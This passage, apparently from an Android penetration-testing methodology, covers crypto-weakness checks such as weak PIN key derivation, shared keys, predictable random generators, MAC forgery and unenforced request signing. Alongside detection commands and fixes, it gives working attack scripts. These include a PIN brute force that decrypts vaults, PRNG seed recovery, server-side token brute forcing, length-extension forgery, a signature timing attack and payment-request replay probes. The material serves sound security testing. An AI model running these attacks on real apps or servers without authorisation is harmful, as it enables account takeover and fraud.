  `PBEKeySpec(pw, salt, 1000, 256)`.
- **How:**
```bash
grep -rn 'new PBEKeySpec(' out/sources/ -B4 -A4        # read the iteration count and the salt argument
grep -rn 'SecretKeyFactory\.getInstance("PBKDF2\|PBEWITH\|scrypt\|Argon2\|bcrypt' out/sources/
grep -rn 'MessageDigest\.getInstance\("SHA-256"\)' out/sources/ -B8 -A8 | grep -inE 'password|passphrase|pin|key ='
```
  Then quantify the offline attack at realistic rates:
```bash
hashcat -a 3 -m 12000 pbkdf2.hash '?d?d?d?d' --status    # PBKDF2-HMAC-SHA1 over a 4-digit PIN
hashcat -a 0 -m 10900 pbkdf2sha256.hash rockyou.txt
```
- **Proof:** The derivation code path showing the fast hash or the low iteration count, **plus** a local
  brute force that recovers the plaintext from a blob you pulled — with the wall-clock time quoted.
- **Escalation:** → D13 (recovered password), D11 (decrypt the local vault).
- **Ruled out when:** The KDF is PBKDF2 with ≥ 600k iterations (or scrypt/Argon2 at current parameters)
  over a per-user `SecureRandom` salt of ≥ 16 bytes, **and** D12-028's requirement is met for low-entropy
  inputs. Record the iteration count and the salt source.

### D12-027 · Missing, hardcoded or predictable salt

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.weak_hash.lack_of_salt` (varies); `cryptographic_weakness.weak_hash.use_of_predictable_salt` (**P5**) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0014 (CWE-759 missing salt, CWE-760 predictable salt) |

- **Test:** A salt that is a constant byte array, an empty array, the username, or reused across users
  makes one precomputation break every user.
- **How:**
```bash
grep -rn 'PBEKeySpec(\|SecretKeyFactory\|MessageDigest' out/sources/ -B6 -A6 | grep -inE 'salt|getBytes\(\)|new byte\[\] *\{'
grep -rn 'generateSeed\|SecureRandom' out/sources/ -A4 | grep -in salt    # the correct construction, to confirm ABSENT
# two clean installs: is the stored salt identical?
for s in emulator-5554 emulator-5556; do adb -s $s shell run-as com.target.app cat shared_prefs/crypto.xml; done
```
- **Proof:** The identical salt value present on two independent installs, or a literal salt byte array in
  the decompile with the derivation that consumes it.
- **Escalation:** Combines with D12-026 into the offline-brute-force finding — file the stretching item as
  the parent and this as the amplifier; on its own, a predictable salt is **P5**.
- **Ruled out when:** Two clean installs produce different salts of ≥ 16 bytes from `SecureRandom`, stored
  alongside (not derived from) the ciphertext.

### D12-028 · Low-entropy input (a 4–6 digit PIN) not combined with Keystore-held material

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) if the vault holds the session |
| **Attacker** | AM-01 with a pulled vault / AM-03 with a read primitive |
| **Applies to** | all apps with a PIN-protected local vault |
| **Maps to** | MASWE-0014 — "for low-entropy inputs the required mitigation is to combine the derived key with keystore-held secret material" |

- **Test:** No KDF work factor saves a 4-digit PIN from an offline attack: 10,000 candidates is trivially
  enumerable regardless of iteration count. The only correct construction combines the PIN-derived key with
  a non-exportable Keystore secret, so the attack must run on-device against a rate-limited key.
- **How:**
```bash
grep -rn 'PBEKeySpec\|Argon2\|scrypt' out/sources/ -B10 -A10 | grep -inE 'pin|passcode|4.digit|6.digit'
# is a Keystore key mixed in at all?
grep -rn 'AndroidKeyStore\|KeyGenParameterSpec\|Mac\.getInstance\("HmacSHA256"\)' out/sources/ -B10 | grep -in 'pin\|derive'
```
```python
import hashlib, itertools
from Crypto.Cipher import AES
blob = open("vault.bin","rb").read(); salt = blob[:16]; iv = blob[16:32]; ct = blob[32:]
for pin in ("%04d" % i for i in range(10000)):
    k = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt, 100000, 32)
    p = AES.new(k, AES.MODE_CBC, iv).decrypt(ct)
    if p[-1] <= 16 and p[-p[-1]:] == bytes([p[-1]])*p[-1]:
        print("PIN", pin, p[:64]); break
```
- **Proof:** The recovered PIN and the decrypted vault contents, with the wall-clock time for the full
  search space stated.
- **Escalation:** → D13 (the vault usually holds the session or the credential).
- **Ruled out when:** The derivation performs an HMAC or a `Cipher` operation under an `AndroidKeyStore`
  key (ideally one with `setUserAuthenticationRequired(true)`) before or after the PBKDF, so the offline
  search cannot proceed without the device — confirm by deleting the Keystore alias and observing the
  decrypt fail.

### D12-029 · One key, many purposes — decode the `KeyGenParameterSpec` purpose bitmask

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.key_reuse.intra_environment` (**P5** on its own — you must demonstrate the cross-protocol use to exceed it) |
| **Attacker** | AM-03 / AM-08 |
| **Applies to** | `KeyGenParameterSpec` is API 23+ |
| **Maps to** | MASTG-TEST-0307 (static), MASTG-TEST-0308 (runtime), MASWE-0007 (CWE-323), MASTG-KNOW-0012, NIST SP 800-57 Pt1 Rev5 §5.2, rule `mastg-android-asymmetric-key-pair-used-for-multiple-purposes` |

- **Test:** NIST requires one purpose per key. On Android the purposes are a bitmask, and the decompile
  shows the **combined integer** — decode it before concluding anything.
- **How:**
```bash
semgrep -c rules/mastg-android-asymmetric-key-pair-used-for-multiple-purposes.yml out/sources/
grep -rn 'KeyGenParameterSpec\.Builder(' out/sources/ -A6
grep -rnE 'PURPOSE_(ENCRYPT|DECRYPT|SIGN|VERIFY|WRAP_KEY|AGREE_KEY)' out/sources/
```
  `PURPOSE_ENCRYPT=1`, `PURPOSE_DECRYPT=2`, `PURPOSE_SIGN=4`, `PURPOSE_VERIFY=8`, `PURPOSE_WRAP_KEY=32`.
  Acceptable values: `1`, `2`, `4`, `8`, `32`, `3` (encrypt|decrypt), `12` (sign|verify). **`15` = all four
  = fails.** The runtime counterpart correlates operations by alias:
```javascript
Java.perform(function () {
  var C = Java.use('javax.crypto.Cipher'), S = Java.use('java.security.Signature');
  C.init.overloads.forEach(function (o) { o.implementation = function () {
    console.log('[Cipher.init] opmode=' + arguments[0] + ' key=' + arguments[1]); return o.apply(this, arguments); }; });
  S.initSign.overload('java.security.PrivateKey').implementation = function (k) {
    console.log('[Signature.initSign] ' + k); return this.initSign(k); };
  S.initVerify.overload('java.security.PublicKey').implementation = function (k) {
    console.log('[Signature.initVerify] ' + k); return this.initVerify(k); };
});
```
- **Proof:** A purposes value outside the acceptable list, or the same alias observed under two of MASTG's
  three disjoint role groups — Encrypt/Decrypt, Sign/Verify, Key Wrapping (`WRAP_MODE`/`UNWRAP_MODE`).
- **Escalation:** A signing oracle reachable from an encryption endpoint; raise to High only with a
  concrete cross-protocol attack built.
- **Ruled out when:** Every alias in the D12-004 table carries a purposes value from the acceptable list
  **and** the runtime correlation shows no alias crossing role groups over a full exercise of the app.

### D12-030 · Same key across environments — production and staging share key material

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.key_reuse.inter_environment` (**P2**, CWE-323) — this is the chapter's crypto-native ceiling |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | Bugcrowd VRT 2026-07-08; note the sibling `key_reuse.intra_environment` is **P5** — establish which you have before submitting, the gap is enormous |

- **Test:** Compare key material across build flavours, across the production and staging APKs, and across
  the app's own environment switch. One key spanning dev and prod means a lower-trust environment's
  compromise (or a leaked staging build, or a developer with staging access) reaches production data.
- **How:**
```bash
# pull every build you can reach: Play, APKMirror/APKPure historical, the vendor's beta/staging track
for apk in prod.apk staging.apk beta_2023.apk; do
  jadx -d out_$apk $apk >/dev/null 2>&1
  echo "== $apk"; grep -rn 'SecretKeySpec' out_$apk/sources/ -B6 | grep -oE '"[A-Za-z0-9+/=]{16,}"' | sort -u
  grep -rhoE '[A-Za-z0-9+/]{32,}={0,2}' out_$apk/res/values/strings.xml | sort -u
done
diff <(...prod keys...) <(...staging keys...)
# does the app switch environments by host only, keeping the key?
grep -rnE 'BuildConfig\.(DEBUG|FLAVOR|BUILD_TYPE)|staging|\.dev\.|sandbox' out/sources/ -B6 -A6 | grep -in 'key\|secret'
```
- **Proof:** The identical key constant present in two different environments' builds, **and** a ciphertext
  produced by the production app decrypted with the key extracted from the staging build (or vice versa) —
  or a production request signed with the staging key and accepted.
- **Escalation:** → D11 (decrypts every user's stored blob), → D15 (sign production requests from a build
  the vendor considers non-production), → D18 if the shared key is a backend credential.
- **Ruled out when:** Only one environment's artefact exists, or the key constants differ between builds,
  or the key is per-install `SecureRandom` material in the Keystore. **If you cannot obtain a second
  environment's build, you do not have this finding — you have `key_reuse.intra_environment` (P5). Say so.**

### D12-031 · Same key across every install — no per-device key derivation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.key_reuse.intra_environment` (**P5** as a bare observation); rate the consequence — `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when it decrypts other users' data you can reach |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | sec-88 checklist §23 "Check if cryptographic keys are reused"; MASTG "Storing a Key" |

- **Test:** Determine whether the key is per-install or baked in. A shared key converts any single-device
  compromise into a fleet-wide one; that is the sentence the report must contain.
- **How:**
```bash
# two independent installs, two devices
for s in emulator-5554 emulator-5556; do
  adb -s $s shell run-as com.target.app sh -c 'cat shared_prefs/*.xml files/*key* 2>/dev/null' > keys_$s.txt
done
diff keys_emulator-5554.txt keys_emulator-5556.txt && echo "IDENTICAL KEY MATERIAL ACROSS INSTALLS"
# and the strong static signal: no Keystore usage at all next to a static constant
grep -rn 'KeyGenParameterSpec\|KeyStore\.getInstance("AndroidKeyStore")\|generateKey(' out/sources/
```
- **Proof:** Identical key material on two independent installs, **and** a successful decryption of device
  B's stored blob with the key extracted from device A.
- **Escalation:** If you can also reach another user's ciphertext (a backup, a cloud sync blob, a shared
  export, a server-returned encrypted field), the rating exits the crypto branch entirely — that is the
  cross-user impact Basecamp's exclusion demands.
- **Ruled out when:** The key bytes differ between the two installs under the D12-002 hook, or the alias in
  the D12-004 table was generated per-install with `KeyGenParameterSpec` and no constant is involved.

### D12-032 · One key reused across subsystems (storage, signing, transport, integrity)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.key_reuse.intra_environment` (P5); High only when you recover the key from the weak context and use it in the strong one |
| **Attacker** | AM-01 / AM-08 |
| **Applies to** | all |
| **Maps to** | Hrishikesh "Some Other Checks" #1 ("the application doesn't reuse the same cryptographic key for multiple purposes") |

- **Test:** One key for local DB encryption, token signing, transport protection and integrity means the
  weakest context sets the security of all of them. Inventory every alias and constant, then map each to
  its call sites.
- **How:**
```bash
# build the alias→callsite map
grep -rnoE '"[A-Za-z0-9_.-]{4,40}"' out/sources/ --include='*Crypto*' --include='*Key*' | sort | uniq -c | sort -rn | head
grep -rn 'getKey("\|getEntry("\|KeyGenParameterSpec\.Builder("' out/sources/ -A2
```
  Then hook `KeyStore.getKey` (D12-004) and record the alias immediately preceding each `Cipher.doFinal`,
  `Mac.doFinal` and `Signature.sign` to build the map empirically.
- **Proof:** The same alias or constant appearing in both the local-storage path and the request-signing
  path, evidenced by the interleaved hook log.
- **Escalation:** Recover the key from the weak context (a memory dump, a hardcoded constant, a
  software-backed alias) and forge in the strong one — that demonstration is what lifts this off P5.
- **Ruled out when:** Each subsystem uses a distinct alias, and the hook log shows no alias crossing
  subsystems over a full exercise of the app.

### D12-033 · `java.util.Random` / `Math.random()` at a security sink

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_prng_seed` (P4) / `.small_seed_space_in_prng` (P4) / `.limited_rng_entropy_source` (P4); exit via `broken_authentication_and_session_management.two_fa_bypass` (P3) → `.authentication_bypass` (P1) when the predicted value is an OTP or a session id |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0204, MASWE-0012 (CWE-330/332/337/338), MASTG-KNOW-0013, MASTG-BEST-0001, rule `mastg-android-random-apis-insufficient-entropy`; MobSF `android_insecure_random`; ASI "Unsafe Encryption" campaign (2019-09-17, `faqs/answer/9450925`) |

- **Test:** `java.util.Random` is a 48-bit linear congruential generator; given the seed the whole sequence
  is reproducible across every Java implementation, and `Math.random()` is `nextDouble()` on a static
  `java.util.Random`. Any token, nonce, IV, OTP, session id or PIN from it is predictable.
- **How:**
```bash
semgrep -c rules/mastg-android-random-apis-insufficient-entropy.yml out/sources/
grep -rnE 'new java\.util\.Random|new Random\(|Math\.random\(\)|ThreadLocalRandom' out/sources/ \
  | grep -viE 'animation|shuffle|jitter|ui|sample'
grep -rn 'SecureRandom' out/sources/          # its ABSENCE at a security sink is the finding
```
  Follow every hit forward with jadx xrefs to see whether it reaches a key, IV, nonce, token, session id,
  password or PIN, and confirm at runtime with a backtrace:
```javascript
Java.perform(function () {
  var R = Java.use('java.util.Random');
  R.nextInt.overload('int').implementation = function (n) {
    var v = this.nextInt(n);
    console.log('[Random.nextInt] ' + v + '\n' +
      Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()));
    return v; };
});
```
  Then recover the state — two consecutive 32-bit outputs are enough to brute the 48-bit seed:
```python
seed_hi = out1 << 16
for lo in range(1 << 16):
    s = (seed_hi | lo)
    s = (s * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)
    if (s >> 16) == out2:
        print("seed", s); break
```
- **Proof:** **Predict the next value before the app produces it**, and show the match — or submit the
  predicted OTP/token and have the server accept it. Collect 50–100 values first; the prediction is the
  finding, the grep hit is not.
- **Escalation:** Predicted OTP → D13 (`two_fa_bypass` P3 → `authentication_bypass` P1). Predicted IV →
  D12-019. Predicted filename → D11/D07.
- **Ruled out when:** Every `Random` hit's forward slice terminates in a UI, animation, retry-jitter,
  sampling or analytics sink — cited by `file:line` — and every security value traces to `SecureRandom`
  with no explicit seeding. MASTG-TEST-0204 requires this "Further Validation Required" step; a `Random`
  used for UI jitter is not a finding and filing it is how a report gets closed.

### D12-034 · Time- or counter-derived "randomness"

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.insufficient_entropy.small_seed_space_in_prng` (P4) / `.limited_rng_entropy_source` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0205 (Non-random Sources Usage), MASWE-0012, MASTG-KNOW-0013, rule `mastg-android-non-random-use` |

- **Test:** The same impact class as D12-033 but harder to grep: `System.currentTimeMillis()`,
  `new Date().getTime()`, `Calendar.MILLISECOND`, `nanoTime()`, or an incrementing counter used as entropy.
- **How:**
```bash
semgrep -c rules/mastg-android-non-random-use.yml out/sources/
grep -rnE 'currentTimeMillis\(\)|new Date\(\)\.getTime\(\)|Calendar\.MILLISECOND|nanoTime\(\)|SystemClock\.(uptimeMillis|elapsedRealtime)' out/sources/ -B4 -A4 \
  | grep -inE 'token|nonce|iv|salt|otp|session|id|key|uuid'
```
  Then brute the plausible window — you usually know the request's timestamp to within a second from your
  own proxy log:
```python
import hashlib, requests
t0 = 1757808000000        # from the Burp timestamp
for t in range(t0 - 5000, t0 + 5000):
    candidate = hashlib.md5(str(t).encode()).hexdigest()[:8]
    if requests.post(url, json={"token": candidate}).status_code == 200:
        print("HIT", t, candidate); break
```
- **Proof:** The server accepting a value you computed from a timestamp window, on the first successful
  attempt after the window is established.
- **Escalation:** Same as D12-033; combine with D12-036 to shrink the window.
- **Ruled out when:** Timestamps appear only as data (an `iat` claim, a log field, a cache key) and never
  as entropy input to a security value; every security value's slice reaches `SecureRandom`.

### D12-035 · `SecureRandom` with a fixed seed, or an uninitialised all-zero key array

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_prng_seed` (P4); `.prng_seed_reuse` (**P5**) |
| **Attacker** | AM-01 |
| **Applies to** | all; the historic `SecureRandom`/`Crypto` provider seeding defect is **LEGACY** and affects only very old releases — the modern finding is the app's own explicit seeding |
| **Maps to** | Oversecured crypto patterns A–C; QARK `crypto/setting_secure_random_seed.py` (`INSECURE_FUNCTIONS = ("setSeed", "generateSeed")`); MASWE-0012, MASWE-0013 |

- **Test:** Three distinct shapes, all producing reproducible keys: (a) `new SecureRandom("seed".getBytes())`,
  (b) key bytes filled from `new Random()`, (c) `byte[] key = new byte[32]` used uninitialised — all zeros.
- **How:**
```bash
grep -rn 'new SecureRandom(' out/sources/ -A2 | grep -v 'new SecureRandom()'
grep -rn 'setSeed(\|generateSeed(' out/sources/ -B4 -A2
grep -rnE 'new byte\[(16|24|32|64|128)\]' out/sources/ -A6 | grep -n 'SecretKeySpec\|IvParameterSpec\|KeyGenerator'
```
```javascript
Java.perform(function () {
  var SR = Java.use('java.security.SecureRandom');
  SR.setSeed.overload('[B').implementation = function (b) {
    console.log('[SecureRandom.setSeed byte[]] len=' + b.length); return this.setSeed(b); };
  SR.setSeed.overload('long').implementation = function (s) {
    console.log('[SecureRandom.setSeed long] ' + s); return this.setSeed(s); };
});
```
- **Proof:** Reproduce the key offline from the same seed and algorithm and decrypt a real ciphertext from
  the device — or, for the all-zero case, decrypt with a zero key. Demonstrate predictability empirically:
  on modern Android `SecureRandom.setSeed` *supplements* rather than replaces entropy, so asserting
  predictability from the call alone is wrong.
- **Escalation:** → D13 if the same generator feeds session or reset tokens.
- **Ruled out when:** Every `SecureRandom` is constructed no-arg and never seeded, and every key-sized
  array is filled by `nextBytes()` or `KeyGenerator.generateKey()` before use — plus two runs producing
  different key bytes under the D12-002 hook.

### D12-036 · Seed-space collapse via a restart oracle

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.insufficient_entropy.small_seed_space_in_prng` (P4); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) via the value it authorises |
| **Attacker** | AM-03 (needs the restart primitive) then AM-01 |
| **Applies to** | all apps that seed a generator at process start |
| **Maps to** | the Samsung Galaxy Store chain, bug 4: the challenge integer came from `new Random(System.currentTimeMillis())` at app start, and a forced restart collapsed the seed space to a ±200 ms window |

- **Test:** A time-seeded generator is only as strong as your uncertainty about the seed. If you can force
  the process to restart at a moment you observe, the search space collapses from "any time" to a few
  hundred milliseconds.
- **How:**
```bash
# force the restart and record the moment
adb shell am force-stop com.target.app
date +%s%3N; adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1; date +%s%3N
adb shell dumpsys activity processes | grep -A3 com.target.app   # process start time
# or use a crash primitive from D04/D05 to restart it on demand
adb shell am start -n com.target.app/.EntryActivity --es payload ''
```
```python
import java_random   # or reimplement the LCG
lo, hi = t_before, t_after           # millisecond bounds captured above
for seed in range(lo, hi + 1):
    r = java_random.Random(seed)
    if r.nextInt(1000000) == observed_challenge:
        print("seed", seed); break
```
- **Proof:** You predict the challenge/nonce and the server or app accepts your response — succeeding on
  the **first** attempt after seed recovery is what makes it a prediction rather than a brute force.
- **Escalation:** Pairs with any restart oracle in D04/D05; that pairing is what makes the seed recoverable
  in practice.
- **Ruled out when:** The generator is seeded from `SecureRandom` or re-seeded per operation, or the value
  is server-issued. If the app uses `java.util.Random` but you have no way to observe or force the start
  moment, say so — the item is present but unproven, which is Informational, not Medium.

### D12-037 · PKCE `code_verifier` generated from a non-cryptographic PRNG

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_prng_seed` (P4); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) once you exchange the code |
| **Attacker** | AM-02 (needs the code-interception step from D09) |
| **Applies to** | apps doing Authorization Code + PKCE natively (RFC 8252) |
| **Maps to** | H1 #824931 (Grammarly, Medium 6.5, CWE "Use of Cryptographically Weak PRNG"; the fix was "moving from PRNG to `SecureRandom`") |

- **Test:** PKCE only protects the code if the verifier is unguessable. A predictable verifier means a
  malicious app that intercepts the code (D09) can complete the exchange.
- **How:**
```bash
grep -rn 'code_verifier\|codeVerifier\|code_challenge\|"S256"' out/sources/ -B10 \
  | grep -nE 'new Random|Math\.random|System\.currentTimeMillis|nanoTime|ThreadLocalRandom|UUID\.randomUUID'
grep -rn 'SecureRandom' out/sources/       # the correct construction, to confirm ABSENT on this path
```
  Capture two authorisation requests and compare the `code_challenge` values for structure; reproduce the
  verifier offline from the observable seed.
- **Proof:** Reproduce the verifier offline, then exchange an intercepted authorisation code for a token —
  the outcome in #824931 was the OAuth `access_token` (the `grauth` cookie), i.e. full ATO.
- **Escalation:** → D13 (account takeover), → D09 (the interception half).
- **Ruled out when:** The verifier is ≥ 43 characters from `SecureRandom` with `S256` challenge method.
  **Note the inverse finding:** an app with *no* PKCE at all on a custom-scheme redirect is the D09
  interception bug with nothing to stop it — and per the mobile-auth doctrine, the OAuth `client_secret`
  shipped in a mobile app is **never-submit**, while **PKCE non-enforcement is the reportable finding**.

### D12-038 · Prove predictability statistically, not anecdotally

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive discipline governing D12-018, D12-033 → D12-037) |
| **Attacker** | AM-12 (harness) |
| **Applies to** | every randomness, timing or oracle claim |
| **Maps to** | the Statistical-Sample Rule; the Shell-Loop Ban; the Body-Diff Rule |

- **Test:** Single outliers are not signal, and a sweep that silently ate half its iterations looks exactly
  like a clean negative. Both failure modes produce confident, wrong crypto findings.
- **How:**
  - **Sample:** minimum **n ≥ 10 interleaved trials per group**, randomised order, never back-to-back.
    Compute mean, median and σ per group; a signal requires the suspect group's mean ≥ **2σ** above the
    control's. The calibration case: `Administrator` took 1527 ms against a ~700 ms control on a single
    shot; n=80 interleaved across 8 groups collapsed every group to mean 685–716 ms, σ 25–74 ms — retracted.
  - **Body-diff:** a bypass or oracle claim needs a response **body** differential.
    `diff <(curl ... control) <(curl ... test)`; a byte-identical 200 is not a bypass. Status-code-only
    claims are the most common rejected-as-N/A category on bug-bounty platforms.
  - **Shell-loop ban:** anything iterating more than five items goes in Python with `try/except` per
    iteration and explicit logging — zsh array expansion fails *silently* and the output still looks
    complete. **Always count your results**; if you expected 10,000 PIN candidates and logged 4,300, the
    loop ate something and your "PIN not recoverable" negative is void.
  - **Multi-tool bar:** reproduce every Critical/High through two independent HTTP stacks (curl + Burp, or
    Python `requests` + raw socket). A curl-only timing differential that vanishes under `requests` was a
    tool artefact.
- **Proof:** The distribution in the report, not the outlier; the byte-level diff; the iteration count
  matching the input count.
- **Escalation:** n/a — this is what stops a crypto report being retracted.
- **Ruled out when:** n/a — always apply it.

### D12-039 · MAC construction misuse — `hash(key‖msg)`, truncated tags, CRC as integrity

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.identity_check_value` (P4) for a non-cryptographic ICV; `.cryptographic_signature` (varies — by impact) for a forged MAC |
| **Attacker** | AM-01 |
| **Applies to** | all |
| **Maps to** | MASWE-0009 (CWE-208/323/327/354/807), MASWE-0008, NIST SP 800-224, NIST SP 800-131A Rev 2, RFC 6151. **No Android MASTG-TEST covers MAC misuse — cite this as a MASTG gap** |

- **Test:** Where the app authenticates messages or stored data, inspect the construction rather than the
  primitive name. MASWE-0009's modes of introduction are the checklist: non-cryptographic checksums,
  MACs over MD5/SHA-1, naive `hash(key‖message)` (length-extension), weak or reused MAC keys, raw CBC-MAC
  over variable-length messages, MAC-then-encrypt, truncated tags, missing replay protection, and
  observable verification failures.
- **How:**
```bash
grep -rnE 'javax\.crypto\.Mac|Mac\.getInstance\("Hmac(MD5|SHA1)"\)|CRC32|Adler32|checksum' out/sources/ -B6 -A6
# the length-extension shape: digest.update(key); digest.update(message); digest.digest()
grep -rn 'MessageDigest' out/sources/ -A8 | grep -nE '\.update\(.*key|\.update\(.*secret'
grep -rn 'copyOf(\|copyOfRange(\|substring(0,' out/sources/ -B4 | grep -in 'mac\|tag\|hmac\|digest'   # truncation
grep -rn 'Mac\.getInstance' out/sources/ -A15 | grep -nE 'doFinal|nonce|timestamp|sequence'           # replay fields
```
  For a confirmed `hash(key‖msg)`:
```bash
hash_extender --data 'user=alice&role=user' --secret 32 --append '&role=admin' \
  --signature <observed_hex> --format sha256
```
- **Proof:** Forge or replay an authenticated message the server or app accepts — the extended message with
  a valid tag, the replayed transaction succeeding twice, or a CRC-32 recomputed over modified content that
  passes the integrity check.
- **Escalation:** → D15 (forged command), D23 (replayed transaction), D17 (forged update manifest).
- **Ruled out when:** Every MAC is HMAC-SHA-256 or better over the full message, with the full tag compared
  in constant time, the MAC key distinct from the encryption key, encrypt-then-MAC ordering, and a
  nonce/timestamp/sequence inside the authenticated payload — and a replay of a captured authenticated
  message is rejected.

### D12-040 · Non-constant-time tag or signature comparison

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `cryptographic_weakness.side_channel_attack.timing_attack` (P4) |
| **Attacker** | AM-01 (remote, against the server-side comparator) / AM-03 (local, against the app's) |
| **Applies to** | all |
| **Maps to** | MASWE-0009 (CWE-208 Observable Timing Discrepancy) |

- **Test:** `Arrays.equals` and `String.equals` short-circuit on the first differing byte. Where the
  comparator is remotely reachable and the tag is attacker-supplied, the comparison leaks the tag byte by
  byte.
- **How:**
```bash
grep -rn 'MessageDigest\.isEqual' out/sources/          # the correct API — note its ABSENCE
grep -rn 'Arrays\.equals(\|\.equals(' out/sources/ -B6 | grep -inE 'mac|tag|hmac|signature|digest|token|otp'
```
  Measure with the interleaved harness from D12-038 — never a single shot, and never in a shell loop:
```python
import random, statistics, time, requests
groups = {b: [] for b in range(0, 256, 16)}
trials = [(b, sig) for b in groups for sig in [("%02x" % b) + "00"*31]] * 10
random.shuffle(trials)
for b, sig in trials:
    t = time.perf_counter(); requests.post(url, data={"sig": sig}); groups[b].append(time.perf_counter()-t)
ctrl = statistics.mean(groups[0]); sd = statistics.pstdev(groups[0])
for b in groups:
    m = statistics.mean(groups[b])
    if m >= ctrl + 2*sd: print("candidate byte", hex(b), round(m,5), "vs", round(ctrl,5), "sigma", round(sd,5))
```
- **Proof:** A distribution — not an outlier — where the correct-prefix group's mean is ≥ 2σ above the
  control, reproduced through a second HTTP stack, followed by a recovered tag.
- **Escalation:** A recovered MAC/tag is D12-039's forgery → D15.
- **Ruled out when:** The comparator is `MessageDigest.isEqual` (or the server's constant-time equivalent),
  **or** the interleaved n≥10 measurement shows every group's mean within 2σ of the control across two
  tools. Network jitter routinely produces 2× outliers; a single slow request is never this finding.

### D12-041 · Request-signing scheme the server never enforces

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies — by impact); exit to `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) or `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | all apps that HMAC or sign requests |
| **Maps to** | ATT&CK T1641.001 (Transmitted Data Manipulation), T1521; MASWE-0009 |

- **Test:** If the app signs requests, three questions decide everything, and all three are answered on the
  **server**, not in the client: is the signature required at all, is it bound to the body, and is it bound
  to a nonce or timestamp?
- **How:**
```bash
grep -rniE 'hmac|Mac\.getInstance|x-sign|x-signature|x-nonce|x-timestamp|checksum|sign\(' out/sources/ -B6 -A6
```
```bash
T='Bearer <live token>'
# 1) strip the signature header entirely
curl -s -o /tmp/a -w '%{http_code}\n' -X POST https://api.target/v1/pay -H "Authorization: $T" \
  -H 'Content-Type: application/json' -d '{"amount":1,"to":"acct_attacker"}'
# 2) keep a valid signature, change the body — is the body in the MAC input?
curl -s -o /tmp/b -w '%{http_code}\n' -X POST https://api.target/v1/pay -H "Authorization: $T" \
  -H 'X-Signature: <captured sig>' -H 'X-Nonce: <captured nonce>' -H 'X-Timestamp: <captured ts>' \
  -d '{"amount":99999,"to":"acct_attacker"}'
# 3) replay the exact signed request twice — is the nonce enforced?
for i in 1 2; do curl -s -o /tmp/c$i -w '%{http_code}\n' -X POST https://api.target/v1/pay \
  -H "Authorization: $T" -H 'X-Signature: <sig>' -H 'X-Nonce: <nonce>' -H 'X-Timestamp: <ts>' -d '<exact body>'; done
diff /tmp/c1 /tmp/c2
# 4) an old timestamp — is freshness enforced?
```
- **Proof:** The request succeeding with the signature header removed (the control is not enforced), or the
  same signed request replaying successfully with a **state change both times** (no nonce), or a changed
  field accepted under the old signature. Diff response **bodies**, not status codes, and show the
  server-side side effect.
- **Escalation:** No server-side enforcement collapses every "the client prevents X" argument across D15
  and D23. Critical on payment endpoints.
- **Ruled out when:** Removing the header returns a distinct rejection body, modifying any byte of the body
  invalidates the signature, the nonce is single-use (the replay's second call returns a distinct
  "duplicate" body), and a stale timestamp is rejected. Record all four probes; three passing and one
  untested is not a negative.

### D12-042 · Signature verified and the result discarded, or the verifier trusts the data it verifies

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies, CWE-347); `insecure_data_transport.executable_download.no_secure_integrity_check` (P4, CWE-353/354/494) when it is an update channel |
| **Attacker** | AM-09 (malicious backend/CDN) / AM-06 (network) / AM-01 |
| **Applies to** | all — in-app update manifests, remote config, OTA bundles, licence blobs, push payloads, downloaded models |
| **Maps to** | MASWE-0009; `developer.android.com/privacy-and-security/risks/unsafe-trustmanager`, `.../unsafe-hostname`; HackerOne Platform Standards AITM baseline `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = High |

- **Test:** This is the scope's "signature verification the app performs on data it trusts". Three failure
  shapes: the boolean from `Signature.verify()` is computed and never branched on; the verifying **public
  key is taken from the signed object itself**; or the verifier runs *after* the data has already been
  parsed, loaded or written.
- **How:**
```bash
grep -rn 'java\.security\.Signature\|initVerify\|\.verify(' out/sources/ -B6 -A15
# the discarded-boolean shape: verify() whose result is not the subject of an if / assert / throw
grep -rn '\.verify(' out/sources/ -A3 | grep -vE 'if *\(|return |throw |assert|\?|&&|\|\|'
# the key-from-the-payload shape
